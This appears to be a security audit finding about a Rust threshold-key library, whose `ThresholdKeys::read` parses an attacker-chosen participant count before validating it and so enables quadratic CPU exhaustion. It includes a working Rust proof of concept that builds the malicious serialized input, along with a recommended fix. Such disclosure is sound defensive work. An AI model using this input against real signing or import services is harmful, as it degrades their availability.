### Title
Unbounded serialized participant count causes quadratic CPU exhaustion in `ThresholdKeys::read` - (File: crypto/dkg/src/lib.rs)

### Summary

`ThresholdKeys::read` trusts the serialized `n` field before validating `ThresholdParams`, using it to allocate and deserialize `n` scalars and `n` group elements. For Lagrange interpolation, successful deserialization then computes interpolation factors for participants `1..=t`, and each factor iterates over all `t` participants. A serialized key with `t = n = u16::MAX` therefore causes approximately 4.29 billion inner-loop field operations from a multi-megabyte public input.

### Finding Description

`ThresholdKeys::read` reads `t`, `n`, and `i` but does not immediately construct or validate `ThresholdParams`. If the interpolation tag selects `Constant`, it preallocates `n` scalars; regardless of the interpolation mode, it then reads one secret scalar and `n` verification shares. Only after all attacker-controlled data has been parsed does it call `ThresholdParams::new` and `ThresholdKeys::new`. [1](#0-0) 

For Lagrange interpolation, `ThresholdKeys::new` creates the participant list `1..=t` and evaluates `interpolation_factor` for every participant. [2](#0-1)  Each Lagrange factor evaluation iterates over the complete included list. [3](#0-2)  Thus `t = n = 65,535` results in roughly `65,535²` field operations, plus the deserialization and storage of 65,535 encoded points.

This is structurally analogous to the referenced issue: the effective participant/resource limit is enforced only after an attacker-controlled count has already driven allocation, deserialization, and expensive computation.

### Impact Explanation

An unprivileged party able to submit bytes to `ThresholdKeys::read` can make the victim perform quadratic field arithmetic and deserialize tens of thousands of group elements from a relatively small serialized input. Repeated submissions can monopolize CPU and materially reduce availability of a signing, recovery, migration, or import service. Because `n` is bounded by `u16::MAX`, this is bounded resource exhaustion rather than unbounded memory growth; the dominant impact is CPU exhaustion.

### Likelihood Explanation

The trigger is entirely contained in serialized input: set `t = n = 0xffff`, use Lagrange interpolation, and provide 65,535 valid encoded verification shares. No malformed encodings, leaked secrets, malicious peer assumptions, or invalid caller-provided cryptographic types are required. Exploitability depends on a deployment accepting untrusted serialized `ThresholdKeys`; local-only key loading would reduce exposure.

### Recommendation

Validate `t`, `n`, and `i` with `ThresholdParams::new` immediately after reading them, before allocating or reading interpolation coefficients and verification shares. Also enforce an explicit protocol maximum for `n`, reject encodings whose declared sizes exceed a bounded byte limit, and avoid the quadratic Lagrange construction in `ThresholdKeys::new` by precomputing products or otherwise deriving factors more efficiently.

### Proof of Concept

```rust
use frost::{curve::Secp256k1, ThresholdKeys};
use ciphersuite::{
  Ciphersuite,
  group::{ff::PrimeField, Group, GroupEncoding},
};

fn malicious_threshold_keys() -> Vec<u8> {
  let n = u16::MAX;
  let mut bytes = Vec::new();

  // Curve identifier.
  bytes.extend_from_slice(
    &u32::try_from(Secp256k1::ID.len()).unwrap().to_le_bytes(),
  );
  bytes.extend_from_slice(Secp256k1::ID);

  // t = n = 65,535, i = 1.
  bytes.extend_from_slice(&n.to_le_bytes());
  bytes.extend_from_slice(&n.to_le_bytes());
  bytes.extend_from_slice(&1u16.to_le_bytes());

  // Interpolation::Lagrange.
  bytes.push(1);

  // Secret share.
  bytes.extend_from_slice(
    <Secp256k1 as Ciphersuite>::F::ONE.to_repr().as_ref(),
  );

  // n valid verification shares.
  let point = Secp256k1::generator().to_bytes();
  for _ in 0 .. n {
    bytes.extend_from_slice(point.as_ref());
  }

  bytes
}

let bytes = malicious_threshold_keys();
let _ = ThresholdKeys::<Secp256k1>::read(&mut bytes.as_slice());
```

The generated input is only a few megabytes for compressed points, but `ThresholdKeys::new` evaluates 65,535 Lagrange factors, each scanning 65,535 participants.

### Citations

**File:** crypto/dkg/src/lib.rs (L230-246)
```rust
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
```

**File:** crypto/dkg/src/lib.rs (L376-378)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();
```

**File:** crypto/dkg/src/lib.rs (L591-631)
```rust
    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```
